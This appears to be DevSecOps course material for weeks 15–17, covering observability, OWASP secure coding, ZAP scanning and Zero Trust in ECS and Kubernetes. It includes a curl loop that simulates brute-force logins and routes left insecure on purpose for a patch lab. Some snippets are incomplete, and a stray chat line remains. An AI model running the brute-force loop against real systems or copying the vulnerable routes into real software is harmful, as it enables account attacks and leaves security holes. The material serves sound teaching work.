## 4️⃣ Distributed Tracing – OpenTelemetry + Tempo or AWS X-Ray

---

## 🧠 What is Distributed Tracing?

Distributed Tracing allows you to follow a single request across multiple services and components.

Think of it like a **breadcrumb trail** that shows:

- Which service handled a request
- How long each step took
- Where the bottlenecks or failures occurred

> 📦 Useful for performance, debugging, and **correlating runtime issues** with logs and metrics.

---

## 🔧 OpenTelemetry Setup Overview

| Component | Role |
|----------|------|
| OpenTelemetry SDK | Captures traces in app |
| Collector | Optional, routes traces to backend |
| Tempo or X-Ray | Stores and visualizes traces |
| Grafana | Visualizes spans and trace graphs |

---

## 👣 A. Add OpenTelemetry to `auth-service` (Node.js)

### 1. Install OpenTelemetry packages

```bash
npm install @opentelemetry/api \
             @opentelemetry/sdk-node \
             @opentelemetry/instrumentation-http \
             @opentelemetry/exporter-trace-otlp-http
2. Create a tracing.js file
// tracing.js
const { NodeSDK } = require('@opentelemetry/sdk-node');
const { getNodeAutoInstrumentations } = require('@opentelemetry/auto-instrumentations-node');
const { OTLPTraceExporter } = require('@opentelemetry/exporter-trace-otlp-http');

const traceExporter = new OTLPTraceExporter({
  url: 'http://tempo:4318/v1/traces', // or use X-Ray here
});

const sdk = new NodeSDK({
  traceExporter,
  instrumentations: [getNodeAutoInstrumentations()],
});

sdk.start();
3. Import tracing in index.js (top of file)
require('./tracing');
✅ This now instruments HTTP, Express, and custom code to send spans to Tempo.

🐍 B. Add OpenTelemetry to notes-service (Python)
1. Install dependencies
pip install opentelemetry-sdk \
            opentelemetry-instrumentation-flask \
            opentelemetry-exporter-otlp \
            opentelemetry-instrumentation-requests
2. Instrument Flask App
from flask import Flask
from opentelemetry.instrumentation.flask import FlaskInstrumentor
from opentelemetry.instrumentation.requests import RequestsInstrumentor
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter

provider = TracerProvider()
exporter = OTLPSpanExporter(endpoint="http://tempo:4318/v1/traces")
span_processor = BatchSpanProcessor(exporter)

provider.add_span_processor(span_processor)
trace.set_tracer_provider(provider)

app = Flask(__name__)
FlaskInstrumentor().instrument_app(app)
RequestsInstrumentor().instrument()
✅ This captures incoming and outgoing HTTP traces, linked with the auth-service.

🧪 C. Deploy Tempo (Backend)
If using Grafana Tempo (open source):

helm repo add grafana https://grafana.github.io/helm-charts
helm install tempo grafana/tempo-distributed
Tempo listens on 4318 by default for OpenTelemetry HTTP.

If using AWS X-Ray:

Set AWS_REGION and credentials

Use X-Ray SDKs or exporters:

Node.js: aws-xray-sdk

Python: opentelemetry-exporter-aws-xray

📊 D. Visualize in Grafana
In Grafana, add Tempo as a new data source

Go to "Explore" → Traces

Run a query like:

service.name = "auth-service"
You’ll see full trace graphs showing:

Request entry point

Internal service hops

Duration of each span

🔐 DevSecOps Tie-In
Benefit	Impact
🕵️ Threat detection	Trace long-running or abnormal paths
🛠️ Troubleshooting	See where requests fail (timeout? auth?)
📊 Performance	Find slow service dependencies
🔁 Feedback loop	Use traces to optimize CI/CD test coverage
📎 Correlation	Combine with logs + metrics for full context
✅ Completion Checklist
✅	Task
🟢 OpenTelemetry installed in both services	
🟢 Traces exported to Tempo or AWS X-Ray	
🟢 Requests traced across services	
🟢 Traces viewable in Grafana	
🧠 App instrumentation explained

## 5️⃣ Dashboards & Alerting – Full Observability in Grafana

---

## 🎨 A. Configure Grafana

1. **Log into Grafana** (`http://localhost:3000`)
2. Add the following **Data Sources**:
   - ✅ Prometheus (`http://prometheus:9090`)
   - ✅ Loki (`http://loki:3100`)

> 🔐 Pro Tip: Use Grafana provisioning to version-control dashboards in Git.

## 📊 B. Create Core Dashboards

### 1. 🧠 **System Metrics (Prometheus + Node Exporter)**

- CPU / Memory per node
- Disk I/O, load average
- Container restarts, uptime

**PromQL example:**

```promql
rate(node_cpu_seconds_total{mode="system"}[5m])
2. 🟦 Auth Service Metrics
Custom metric: login attempts

rate(auth_login_attempts_total[5m])
Additional metrics to add:

Login latency

401/403 response counts

Failed logins per user/IP (security pattern)

3. 🐍 Notes Service Metrics
rate(notes_create_requests_total[5m])
Consider adding:

Note edit frequency

Top users by note creation (correlate with audit logs)

5xx error rates

4. 📜 Log Search (Loki)
Create panels using LogQL:

{app="auth-service"} |= "ERROR"
Useful views:

Top error messages (group by count)

Recent Falco alerts

Filter logs by user_id, request_id, or namespace

5. 🔍 Trace Panels (Tempo)
Use trace ID from logs (e.g., injected via request header or logger):

Visualize full request path: frontend → auth → notes

Detect slow downstream services

Track latency over time

🚨 C. Add Alerts
1. Create Alert Rules in Grafana
Example: too many login failures

rate(auth_login_failures_total[5m]) > 5
Trigger: Critical
Message: ⚠️ Multiple failed login attempts detected in auth-service

2. Configure Alert Notification Channels
Slack Example:

Create an Incoming Webhook URL

In Grafana:

Go to Alerting → Notification Channels → Add Slack

Paste webhook

AWS Example:

Alert → SNS → Lambda → auto-response (e.g. block IP)

🔄 D. Correlate Everything
Create multi-source dashboards:

Panel	Source
CPU Spike	Prometheus
Matching Logs	Loki
Trace Path	Tempo
Falco Alert	Loki
Threat Origin IP	CloudTrail / Logs

# ⚔️ Week 15 Challenge Lab – Simulated Security Incident & Observability Validation

---

## 🧠 Scenario Overview

An attacker is attempting to brute-force login credentials on your `auth-service`. Your DevSecOps goal is to:

1. Detect the attack via **metrics** (rate spikes)
2. Investigate the source via **logs**
3. Trace the request path via **OpenTelemetry**
4. Trigger an **alert**
5. Respond automatically or manually
6. Correlate all findings in **Grafana**

---

## 🎯 Objectives

| Goal | Success Indicator |
|------|-------------------|
| Detect abnormal activity | Spike in login failures metric |
| Confirm via logs | Multiple failed login attempts |
| View trace path | Slow response spans or retries |
| Trigger alert | Slack/Email or EventBridge fires |
| (Optional) Respond | Block IP or tag source |
| Dashboard correlation | Metrics, logs, traces line up visually |

---

## 🛠️ Step 1: Simulate Brute Force

You can use a script or a tool like `hydra`, `ab`, or curl in a loop.

### A. Simulate failed login loop

```bash
for i in {1..50}; do
  curl -X POST http://localhost:3000/login \
    -H "Content-Type: application/json" \
    -d '{"username":"user'$i'", "password":"wrong"}'
done
✅ This will:

Spike your auth_login_failures_total counter

Emit 401 Unauthorized logs

Generate traces if OpenTelemetry is hooked in

📊 Step 2: Monitor Metrics in Grafana

rate(auth_login_failures_total[1m])
✅ You should see a sharp increase, confirming abnormal behavior.

📜 Step 3: Investigate Logs (Loki)
Go to Explore → Loki

{app="auth-service"} |= "LOGIN FAILED"
Add filters:

By IP address

By user

By timestamp

✅ Correlate logs with spike time.

🔍 Step 4: Analyze Traces
Go to Explore → Tempo

Query by service.name = "auth-service"

Check recent traces

Look for:

High response times

Repeated failed auth attempts

Request path from frontend → auth

🚨 Step 5: Validate Alerting
Go to Alerting → Alert Rules

Your rule should fire:

rate(auth_login_failures_total[1m]) > 10
Notification:

Slack, Email, or AWS SNS

✅ Alert should include:

Timestamp

Affected service

Failure count

🛡️ Step 6: Optional Response (AWS or Manual)
If using AWS:

Create EventBridge Rule:

Trigger Lambda function that:

Tags source IP

Updates WAF rule

Sends to SecurityHub

If local:

Log offending IP

Block with iptables or security group update

# 🔐 Week 15 – Observability, Detection & Runtime Security

---

## 🧠 Concept: Observability as a Security Control

Observability isn’t just about performance — it’s a critical layer in your **security stack**. Logs, metrics, and traces help detect, investigate, and respond to security incidents **in real time**.

> 🔍 "You can’t secure what you can’t see."

---

## 🔐 Security Objectives This Week

| Goal | Tool | Outcome |
|------|------|---------|
| Detect attacks | Prometheus | Login failure spikes |
| Investigate behavior | Loki | Who, what, where logs |
| Trace attack paths | Tempo / X-Ray | End-to-end request visibility |
| Alert + Respond | Grafana Alerts / SNS | Rapid incident response |
| Prove compliance | Dashboards | Audit evidence + forensics |

---

## 🧠 Why Logs, Metrics, and Traces Matter

| Type | Security Role |
|------|----------------|
| **Metrics** | Show patterns and anomalies (rate of failures, CPU spikes) |
| **Logs** | Contain forensic details (user, IP, timestamp, error) |
| **Traces** | Reveal flow of an attack across services |
| **Alerts** | Enable human or automated intervention |
| **Dashboards** | Show real-time health + incident history |

---

## 🧪 Runtime Threats Detected

| Threat | Example | Detection |
|--------|---------|-----------|
| Brute Force | Multiple failed logins | auth_login_failures_total + logs |
| DDoS | Burst of requests | High CPU/memory + request rate |
| Injection | Malformed requests in logs | Regex filters or anomaly logs |
| Privilege Abuse | Service A calling restricted API | Trace span analysis |
| Exploits | Abnormal container behavior | Falco integration (Week 14) |

---

## 🔄 Defense-in-Depth Layers Reinforced

| Layer | Tool | Security Value |
|-------|------|----------------|
| ✅ Runtime | Node Exporter, Prometheus | Behavior monitoring |
| ✅ Application | Prom-client, tracing SDKs | Endpoint instrumentation |
| ✅ Logging | Promtail / CloudWatch | Centralized audit trail |
| ✅ Alerting | Grafana, SNS, Slack | Timely escalation |
| ✅ Response | Lambda, WAF | Containment automation |
| ✅ Visualization | Grafana Dashboards | Security transparency |

---

## 🔐 Secure Observability Best Practices

- 📌 Use structured logs (JSON) for easier parsing
- 🔐 Avoid logging sensitive data (passwords, tokens)
- 🪪 Tag logs and traces with `user_id`, `request_id`
- 🧠 Create prebuilt dashboards for common attack types
- 🧾 Retain logs and metrics as per compliance policies

---

## 🧠 DevSecOps Maturity Lens

| Maturity Level | Description |
|----------------|-------------|
| 🟡 Basic | Metrics only, no correlation |
| 🟠 Intermediate | Metrics + Logs, some alerting |
| 🟢 Advanced | Metrics + Logs + Traces + Response |
| 🔵 Enterprise | Full-stack observability with SLOs, anomaly detection, and automated triage |

---

## ✅ Summary

You’ve now implemented a complete observability and runtime detection layer, tied into:

- Application instrumentation
- Kubernetes/EC2 system metrics
- Log aggregation
- Request traces
- Real-time alerting
- Optional incident response triggers

This makes your system both **observable and defensible**, which is critical for modern DevSecOps workflows.

---

## 📚 Core Concepts

### 🔟 OWASP Top 10 Overview (2021 version)

| Risk | Example |
|------|---------|
| 1. Broken Access Control | Changing user roles via API |
| 2. Cryptographic Failures | Using weak or no HTTPS/TLS |
| 3. Injection | SQL/NoSQL/Command injection |
| 4. Insecure Design | Logic flaws like account takeover |
| 5. Security Misconfig | Default secrets, verbose errors |
| 6. Vulnerable Components | Outdated packages with CVEs |
| 7. ID & Auth Failures | Weak session/token handling |
| 8. Data Integrity Failures | Insecure deserialization |
| 9. Monitoring Failures | No detection of API abuse |
| 10. SSRF | Server fetching remote resources blindly |

| Enforce HTTPS / CSP headers | Both | Security Misconfig (A05) |
| Upgrade vulnerable deps | Both | Vulnerable Components (A06) |
| Add brute-force limiter | Node.js | Auth Failures (A07) |
| Unit tests for validation & access control | Both | Insecure Design (A04) |

## 💡 DevSecOps Context

| Practice | Why It Matters |
|---------|----------------|
| Shift-left security | Catch vulns during dev, not prod |
| Secure coding | Reduce reliance on perimeter defenses |
| App-layer threat modeling | APIs are the real attack surface |
| Defense in depth | Combine runtime detection with code safeguards |
| Reproducibility | Scanners and validation as part of CI/CD |

# 🛠️ Week 16 – Guided Lab: Secure Code Practices for Node.js & Python APIs

---

## 🧪 Lab Scope

You’ll:

- Add input validation to Node.js and Python services
- Fix auth bypass by implementing proper role checks (RBAC)
- Apply secure headers (CSP, XSS protection, HSTS)
- Upgrade vulnerable dependencies
- Introduce brute-force protection (rate limiting)
- Run static analysis (Bandit + ESLint security plugins)
- Validate with unit tests

---

## 🔰 Part 1 – Input Validation

### A. Node.js Auth-Service

#### Step 1: Install `express-validator`

```bash
npm install express-validator
Step 2: Add validation middleware to /login
// routes/auth.js
const { body, validationResult } = require('express-validator');

router.post('/login', [
  body('username').isAlphanumeric().notEmpty(),
  body('password').isLength({ min: 8 })
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

  // proceed with login
});
✅ Why: Prevents injection, malformed input, and logic errors.

B. Python Notes-Service
Step 1: Install pydantic
pip install pydantic
Step 2: Validate input in Flask route
from pydantic import BaseModel, ValidationError
from flask import request

class NoteInput(BaseModel):
    title: str
    body: str

@app.route('/note', methods=['POST'])
def create_note():
    try:
        data = NoteInput(**request.get_json())
    except ValidationError as e:
        return jsonify({'errors': e.errors()}), 400
    # Proceed to store note
✅ Why: Prevents script injection, NoSQL injection, and malformed data storage.

🧑‍⚖️ Part 2 – Role-Based Access Control (RBAC)
Node.js Auth-Service (Admin-Only Route Example)
Step 1: Create checkRole middleware
function checkRole(role) {
  return (req, res, next) => {
    if (req.user?.role !== role) {
      return res.status(403).json({ message: 'Access denied' });
    }
    next();
  };
}
Step 2: Protect routes
router.post('/user/delete', checkRole('admin'), deleteUserHandler);
✅ Why: Fixes broken access control (OWASP A01)

🧱 Part 3 – Secure Headers
A. Node.js (Express)
npm install helmet
const helmet = require('helmet');
app.use(helmet());
✅ Adds:

X-Content-Type-Options

X-XSS-Protection

Content-Security-Policy

Strict-Transport-Security

B. Python (Flask)
pip install flask-talisman
from flask_talisman import Talisman
Talisman(app)
✅ Automatically enforces HTTPS and adds secure headers.

🚫 Part 4 – Rate Limiting (Brute-Force Protection)
Node.js (auth-service)
npm install express-rate-limit
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});

app.post('/login', loginLimiter, loginHandler);
✅ Helps detect/prevent brute-force attacks (OWASP A07).

🔎 Part 5 – Static Code & Dependency Scanning
A. Node.js
npm audit fix
npx eslint --plugin eslint-plugin-security .
B. Python
pip install bandit pip-audit
bandit -r .
pip-audit
✅ SAST + dependency scan → early detection of known issues.

🧪 Part 6 – Unit Testing Security Logic
Example: Node.js
describe('POST /login', () => {
  it('should reject short passwords', async () => {
    await request(app)
      .post('/login')
      .send({ username: 'user', password: '123' })
      .expect(400);
  });
});
Example: Python
def test_invalid_note_input(client):
    response = client.post('/note', json={"title": 1, "body": []})
    assert response.status_code == 400
✅ Ensures validation logic works + prevents regressions.

✅ Completion Checklist
✅	Task
🟢 Input validation implemented in both services	
🟢 Secure headers configured	
🟢 RBAC controls added	
🟢 Rate limiting applied	
🟢 Static & dependency scans run	
🟢 Unit tests validate security logic	
🔐 Key DevSecOps Outcome
Application-level risks mitigated with code-based controls

Proactive scanning and validation tools added to workflow

Secure-by-default patterns introduced in all critical routes

# 🧨 Week 16 – Challenge Lab: Exploitation & Patch Cycle (OWASP DAST)

---

## 🧠 Scenario

Your team deployed a recent version of `auth-service` and `notes-service` to staging. A security researcher reported potential access control and input validation vulnerabilities.

You must:

1. Simulate the vulnerabilities (in a known-vulnerable branch)
2. Validate the risks using **OWASP ZAP**
3. Fix them using the Guided Lab techniques
4. Re-run ZAP and verify the risks are mitigated
5. Add the ZAP test to CI/CD (optional)

---

## 🧪 Part 1 – Simulate Vulnerable API

### A. Insecure `/login` route (Node.js)

In a test branch:

```js
// app.js
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // No validation!
  db.findUser({ username, password }) // vulnerable
    .then(user => res.json(user))
    .catch(err => res.status(401).send('Unauthorized'));
});
✅ Issue: No input validation = injection risk.

B. Exposed Admin Route (No RBAC)
app.post('/user/delete', deleteUserHandler);
// No role check
✅ Issue: Any logged-in user can delete accounts.

C. Python Notes-Service lacks header enforcement
# No Flask-Talisman → no HTTPS or CSP headers
@app.route('/note', methods=['POST'])
def post_note():
    data = request.get_json()  # no validation
    ...
✅ Issue: Insecure defaults, malformed input, XSS risk.

🧰 Part 2 – ZAP Active Scan
A. Run ZAP Docker (headless)
docker run -u zap -p 8080:8080 \
  -i owasp/zap2docker-stable zap.sh -daemon -port 8080 -host 0.0.0.0 -config api.disablekey=true
B. Scan staging app (Node.js)
zap-cli -p 8080 status -t 60
zap-cli -p 8080 open-url http://localhost:3000
zap-cli -p 8080 active-scan http://localhost:3000
zap-cli -p 8080 alerts
C. Export report
zap-cli -p 8080 report -o zap_report.html -f html
✅ Look for:

Missing input validation

Authentication/authorization issues

Missing X-Frame-Options, HSTS, etc.

Exposed error messages

🔒 Part 3 – Patch Issues
Apply fixes from GuidedLab.md

Re-add middleware, headers, validation

Confirm secure defaults

✅ Re-run ZAP → alerts should drop or disappear

🧪 (Optional) CI/CD Integration
GitHub Actions + ZAP example
jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
    - name: Run ZAP
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'http://your-staging-url.com'
✅ Ensures that common OWASP issues are blocked from deployment.

✅ Completion Checklist
✅	Task
🟢 Vulnerable routes simulated	
🟢 ZAP scan run and report exported	
🟢 Issues fixed (RBAC, validation, headers)	
🟢 Post-patch scan confirms risk mitigation	
🟢 (Optional) ZAP added to CI/CD	
🧠 Report included in repo/docs	
🧠 Challenge Reflection Prompts
Which vulnerabilities did ZAP catch vs what was missed?

What’s the difference between SAST and DAST?

How would you handle false positives in automated DAST scans?

Should DAST fail a build, or just raise warnings?

🔐 DevSecOps Takeaway
This lab reinforces “test like an attacker” mindset. Tools like ZAP help simulate real HTTP abuse patterns — a powerful way to catch bugs that SAST alone will miss. In a CI/CD context, DAST becomes part of your automated risk gate before production.

# 🔐 Week 16 – Security Concepts: Application Security & OWASP Top 10

---

## 🎯 Why This Matters

Your infrastructure can be locked down and monitored, but if your **application code** is vulnerable, attackers can:

- Steal or modify user data
- Bypass authentication or authorization
- Abuse logic flaws to escalate access
- Trigger runtime crashes or remote code execution

That’s why **AppSec** is a core pillar of DevSecOps — **shifting security left** into the software development lifecycle (SDLC) where bugs are introduced and can be caught earliest.

---

## 📚 Core Concepts

### 🔟 The OWASP Top 10

A curated list of the **most critical security risks** to web applications, updated regularly by the security community. This lab focused on:

| OWASP ID | Example | Fix |
|----------|---------|-----|
| A01 – Broken Access Control | Admin routes accessible to all | Add RBAC middleware |
| A03 – Injection | SQL/NoSQL/command injection | Input validation, parameterization |
| A05 – Security Misconfig | Missing CSP/HSTS | Use Helmet/Talisman, configure headers |
| A06 – Vulnerable Components | Outdated npm/pip packages | Use `npm audit`, `pip-audit`, Renovate |
| A07 – Auth Failures | Weak tokens, no rate limiting | Add brute-force protection, HTTPS only |
| A09 – Monitoring Failures | No logs or alerts | Solved in Week 15 with logging/tracing |

---

### 🛠 DevSecOps Techniques Applied

| Technique | Tool/Method | Risk Mitigated |
|----------|-------------|----------------|
| Input validation | express-validator, pydantic | Injection |
| Secure headers | Helmet (Node), Talisman (Python) | Misconfig |
| Rate limiting | express-rate-limit | Brute-force |
| Dependency scanning | `npm audit`, `pip-audit` | Vulnerable libs |
| SAST | ESLint security plugin, Bandit | Insecure code |
| DAST | OWASP ZAP | Runtime abuse, auth bypass |
| Role-based access | Middleware RBAC checks | Broken access control |

---

## 🧠 Threat Modeling Reminder

| Threat | Mitigation |
|--------|------------|
| Attacker sends payload to unvalidated endpoint | Pydantic + express-validator |
| Attacker replays tokens to access /admin | RBAC middleware + session expiry |
| User input used in log or query | Input sanitation, no direct insertion |
| Brute-force login with automation | Rate limiter, alerting, ban IP |
| Service exposes error stack traces | Production error handlers, logging hygiene |

---

## 🔐 The DevSecOps Perspective

**DevSecOps is not just about tools.** It's about:

1. **Security ownership by developers**
2. **Enforcing security policies in code and CI/CD**
3. **Automated feedback loops** (e.g. ZAP reports in PRs)
4. **Testing security like functionality**
5. **Educating teams to identify bad patterns**

---

## 🧩 Real-World Practice Tips

| Practice | Recommendation |
|---------|----------------|
| 🧪 Test for OWASP Top 10 regularly | Automate ZAP/Burp scans in CI or pre-deploy |
| 🔐 Secure by default | All routes must validate + authorize |
| 🧠 Think like an attacker | Review code for logic abuse |
| 📜 Log securely | No sensitive info in logs, use structured format |
| 🔁 Review deps monthly | Use Dependabot, Renovate, `npm audit`, `pip-audit` |
| 🛠 Patch + regression test | Every bug fix = new test case |
| 🌐 API security | Use schema validation, rate limits, JWT expiration checks |

# 🛡️ Week 17 – Zero Trust in ECS + Kubernetes

---

## 🎯 Objective

This week, you’ll design and enforce **Zero Trust architecture** at the **workload and service level** within ECS and Kubernetes environments. We’ll implement strict identity- and context-based access, moving away from the outdated assumption that internal networks are trusted.

---

## 💡 What Is Zero Trust?

> “Never trust, always verify.”

Zero Trust is a security framework that:
- Eliminates implicit trust in networks, workloads, and users
- Requires continuous verification for every access request
- Uses least privilege, segmentation, and strong identity for enforcement

---

## 🔍 Core Concepts

| Concept | Meaning | DevSecOps Application |
|--------|--------|------------------------|
| **Workload Identity** | Each container or pod has a verifiable identity | Use IAM Roles for ECS, SPIRE or IRSA for EKS |
| **Policy Enforcement Point** | Controls who can talk to whom | NetworkPolicies (K8s), Service Connect (ECS) |
| **Authentication Everywhere** | TLS/mTLS, signed tokens | Use certs + JWT + IAM auth |
| **Microsegmentation** | Break flat networks into granular zones | Namespaces, ECS environments |
| **Least Privilege Access** | Services have only the permissions they need | Use scoped IAM roles, RBAC, scoped service-to-service traffic |

---

## 🛠️ Tools You’ll Use

| Tool | Platform | Purpose |
|------|----------|---------|
| **ECS Service Connect** | ECS Fargate/EC2 | Secure service discovery, namespace isolation |
| **IAM Roles for Tasks** | ECS | Identity and access for containers |
| **Kubernetes NetworkPolicies** | EKS | Pod-level traffic control |
| **SPIRE** (optional) | Kubernetes | Workload identity via SPIFFE |
| **Envoy or App Mesh** | Both | Optional layer 7 control for advanced use |
| **Mutual TLS (mTLS)** | Both | Authenticate every service call |
| **Secrets Manager / Vault** | Both | Inject secrets scoped by identity |

---

## 🧱 DevSecOps Tie-In

| Principle | Implementation |
|----------|----------------|
| **Shift-left for auth** | Services must assert and validate identity at runtime |
| **Defense in depth** | Combine IAM, mTLS, network policy, and namespace boundaries |
| **Secure defaults** | Deny all by default, explicitly allow minimal access |
| **Runtime enforcement** | No bypassable firewall rules — use policy engines and sidecars |
| **Visibility** | Track access patterns, enforce audits, log requests at boundaries |

---

## 🧪 Lab Preview

You’ll:

- Create **strictly isolated namespaces** in ECS and Kubernetes
- Use **IAM roles** and **service-to-service TLS** for workload identity
- Block unnecessary east-west traffic in staging and dev
- Implement a **deny-all, allow-explicit** traffic model
- Test scenarios where services try to break Zero Trust

---

## 🌐 App Evolution

Your microservices will now:

| Layer | Upgrade |
|-------|---------|
| 🧠 Identity | Each service (auth, notes, search) gets its own IAM or K8s identity |
| 🔗 Traffic | Only frontend → backend allowed; backend can’t talk to search unless scoped |
| 🔐 Secrets | Vault/SOPS secrets scoped to the service identity |
| 🌍 Staging | Dev service can query versioned staging services (e.g. search:v2) if allowed |
| 🚫 Testing | Dev backend cannot call dev backend — enforced by traffic policies |

---

## 🛡️ Outcome

By the end of this week, you’ll be able to:

✅ Design and apply **Zero Trust policies** in both ECS and EKS  
✅ Enforce **identity-aware access** using IAM, service roles, and TLS  
✅ Limit **service communication paths** to only what is necessary  
✅ Prevent privilege escalation between environments and services  
✅ Prepare your platform for **compliance-level segmentation**

Do the same in Kubernetes with NetworkPolicies + Service Accounts

Both environments will evolve the app to show how microservices can respect Zero Trust boundaries dynamically.

# 🛠️ Week 17 – Guided Lab: Implementing Zero Trust in ECS + Kubernetes

---

## 🎯 Goal

Enforce Zero Trust by controlling service-to-service traffic using:

- **Service Connect + IAM Roles (ECS)**
- **NetworkPolicies + Service Accounts (Kubernetes)**
- Environment isolation (dev, staging, prod)
- Identity-aware access with least privilege

---

## 🧪 Part 1 – ECS Fargate Zero Trust Implementation

---

### 🔧 Step 1: Setup Service Connect Namespace

```bash
aws servicediscovery create-http-namespace \
  --name dev.notesapp.local \
  --description "Dev namespace for Service Connect"
🧠 Why? Namespaces define isolated DNS/service networks — Zero Trust begins with clear boundaries.

⚙️ Step 2: ECS Task Definitions with IAM Role
IAM Role:

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ssm:GetParameters",
        "secretsmanager:GetSecretValue"
      ],
      "Resource": "arn:aws:secretsmanager:REGION:ACCOUNT_ID:secret:notesapp/*"
    }
  ]
}
✅ This ensures each service only accesses its own secrets.

Attach this IAM role to each service’s task definition:

"taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/notesapp-auth-role",
🔌 Step 3: Enable Service Connect
In the ECS service definition:

"serviceConnectConfiguration": {
  "enabled": true,
  "namespace": "dev.notesapp.local",
  "services": [
    {
      "portName": "http",
      "discoveryName": "auth",
      "clientAliases": [{ "port": 80 }]
    }
  ]
}
This allows frontend to talk to auth.notesapp.local via Service Connect proxy.

🧠 Service Connect enforces traffic policies by routing through a sidecar proxy, not raw IPs.

🔐 Step 4: Restrict Communication
In the frontend task role, allow only auth:

{
  "Effect": "Allow",
  "Action": "servicediscovery:DiscoverInstances",
  "Resource": "arn:aws:servicediscovery:namespace/dev.notesapp.local"
}
Then explicitly block calls like backend → backend by omitting aliases and IAM permissions.

🧪 Part 2 – Kubernetes Zero Trust Implementation
📦 Step 1: Namespace Isolation
kubectl create ns dev
kubectl create ns staging
Each namespace = an environment with separate RBAC, secrets, and network policies.

🔐 Step 2: Service Accounts per Service
kubectl create serviceaccount auth-sa -n dev
kubectl create serviceaccount frontend-sa -n dev
Add to your Deployment:

spec:
  template:
    spec:
      serviceAccountName: auth-sa
This service identity is used for RBAC, secret access, and traffic controls.

📡 Step 3: NetworkPolicies
Start with deny-all:

kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: dev
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
Then explicitly allow frontend → auth:

kind: NetworkPolicy
metadata:
  name: allow-frontend-to-auth
  namespace: dev
spec:
  podSelector:
    matchLabels:
      app: auth
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend
🔐 No other service can now access auth unless explicitly permitted.

💼 Step 4: Restrict Secrets Access
Use RBAC to limit secrets access:

kind: Role
metadata:
  name: auth-secrets
  namespace: dev
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["auth-secret"]
    verbs: ["get"]
Bind it to auth-sa only:

kubectl create rolebinding auth-secret-bind \
  --role=auth-secrets \
  --serviceaccount=dev:auth-sa \
  -n dev
📊 Step 5: Confirm Isolation
Try these tests:

Scenario	Expected
frontend → auth	✅ Allowed
backend → backend	❌ Denied
dev → staging search:v2	✅ Allowed (only if permitted in policy)
dev frontend → prod auth	❌ Blocked (cross-namespace)
✅ Completion Checklist
✅	Task
🧱 Namespaces created per environment	
🔐 IAM roles / ServiceAccounts per service	
⚙️ Service Connect enabled and isolated	
📡 NetworkPolicies applied (K8s)	
🔒 Secrets scoped by identity	
🔎 Traffic tested and denied/allowed appropriately	
🧠 Key Learnings
Zero Trust enforces identity + policy, not just network location

Service-to-service auth is enforceable with IAM, mTLS, and proxy layers

Kubernetes and ECS can both achieve fine-grained segmentation

Every environment, service, and secret should be scoped and verified


---

Let me know when you're ready to proceed with the `ChallengeLab.md`, which simulates **Zero Trust failures** and forces you to trace, debug, and fix the policy or IAM gap.

This will really cement the “trust nothing” mindset.

# ⚔️ Week 17 – Challenge Lab: Zero Trust Policy Debugging

---

## 🎯 Objective

Your goal is to identify and resolve **intentional violations of Zero Trust** principles in both ECS and Kubernetes environments.

---

## 🧪 Scenario Overview

Your platform team receives alerts and unexpected logs:

1. 🚨 **Dev backend is making unauthorized calls to itself**
2. 🚨 **Search service in `dev` is calling `auth` in `staging`**
3. 🚨 **Frontend in `dev` can't reach `auth`, even though it should**

You must fix these problems without breaking Zero Trust.

---

## 🧩 Part 1 – ECS Fargate Zero Trust Challenge

### 🛠 Reproduce the Problem

Deploy `backend` service with misconfigured Service Connect:

```json
"services": [
  {
    "portName": "http",
    "discoveryName": "backend",
    "clientAliases": [{ "port": 80 }]
  }
]
❌ This allows the backend to talk to itself, breaking Zero Trust.

✅ Fix
Remove the clientAliases field from backend’s Service Connect config

Deny backend's IAM role from discovering backend.notesapp.local

{
  "Effect": "Deny",
  "Action": "servicediscovery:DiscoverInstances",
  "Resource": "arn:aws:servicediscovery:service/backend.notesapp.local"
}
🔎 Misrouted Cross-Env Call
search.dev tries to talk to auth.staging, which breaks environment isolation.

Fix this by enforcing cross-env DNS control and IAM:

Ensure only staging IAM roles can resolve auth.staging.notesapp.local

Set Service Connect namespace per environment, with DNS not resolving across them

{
  "Effect": "Deny",
  "Action": "servicediscovery:DiscoverInstances",
  "Condition": {
    "StringNotEquals": {
      "servicediscovery:NamespaceName": "dev.notesapp.local"
    }
  }
}
🧩 Part 2 – Kubernetes Zero Trust Challenge
🧪 Problem 1: Self-call
Backend pod is trying to call itself over the network.

Test this:

kubectl exec -n dev backend-pod -- curl http://backend:3000/internal
❌ Call succeeds — violating Zero Trust.

✅ Fix
Apply this deny self-ingress policy:

kind: NetworkPolicy
metadata:
  name: deny-self-calls
  namespace: dev
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
    - from:
        - podSelector:
            matchExpressions:
              - key: app
                operator: NotIn
                values:
                  - backend
🧪 Problem 2: Cross-namespace call from dev to staging
kubectl exec -n dev search-pod -- curl http://auth.staging.svc.cluster.local:3000/
❌ Call succeeds unless blocked.

✅ Fix
Apply NetworkPolicy in staging to deny ingress from dev

Use strict namespace selectors:

- from:
    - namespaceSelector:
        matchLabels:
          name: staging
Then label your namespaces:

kubectl label ns staging name=staging
kubectl label ns dev name=dev
🧪 Problem 3: Frontend can't reach auth (should be allowed)
Fix: Likely missing a NetworkPolicy or incorrect label

Verify frontend → auth is explicitly allowed

Ensure pod labels match exactly (case-sensitive!)

podSelector:
  matchLabels:
    app: auth
🧠 Real-World Debugging
Symptom	Fix
Allowed calls when they shouldn't be	Check IAM roles or NetworkPolicy missing
Denied calls when they should be	Labels may be misconfigured
Cross-env calls working	Wrong DNS or namespace scoping
Traffic still flowing after deny-all	Sidecar bypass, wrong selector, or old pods
✅ Completion Checklist
✅	Task
Blocked backend self-calls in ECS and K8s	
Enforced DNS and IAM boundaries per namespace	
Denied dev → staging service calls	
